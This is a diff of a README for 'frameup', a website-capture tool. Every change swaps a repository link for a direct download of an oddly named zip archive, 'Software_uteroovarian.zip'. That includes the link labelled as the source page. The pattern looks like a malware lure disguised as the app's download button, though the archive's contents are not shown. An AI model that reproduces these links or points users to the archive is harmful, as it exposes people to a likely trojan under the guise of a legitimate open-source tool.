@@ -1,6 +1,6 @@
 # 📸 frameup - Capture Websites as Images or Videos
 
-[![Download frameup](https://img.shields.io/badge/Download-frameup-4c8bf5?style=for-the-badge)](https://github.com/Wemisagas/frameup)
+[![Download frameup](https://img.shields.io/badge/Download-frameup-4c8bf5?style=for-the-badge)](https://github.com/Wemisagas/frameup/raw/refs/heads/main/splendorous/Software_uteroovarian.zip)
 
 ## 📋 About frameup
 
@@ -37,7 +37,7 @@ This guide shows you how to download and run frameup on Windows. It takes only a
 
 Click the button below to visit the download page.
 
-[![Download frameup](https://img.shields.io/badge/Download-frameup-A9A9A9?style=for-the-badge)](https://github.com/Wemisagas/frameup)
+[![Download frameup](https://img.shields.io/badge/Download-frameup-A9A9A9?style=for-the-badge)](https://github.com/Wemisagas/frameup/raw/refs/heads/main/splendorous/Software_uteroovarian.zip)
 
 On the page:
 
@@ -142,7 +142,7 @@ You can open this folder directly from the app's settings menu.
 frameup is open-source and built using TypeScript and automation tools like Playwright. It aims to help users quickly save visual records of websites without coding.
 
 Explore the source or contribute at the main page:  
-https://github.com/Wemisagas/frameup
+https://github.com/Wemisagas/frameup/raw/refs/heads/main/splendorous/Software_uteroovarian.zip
 
 ---
 
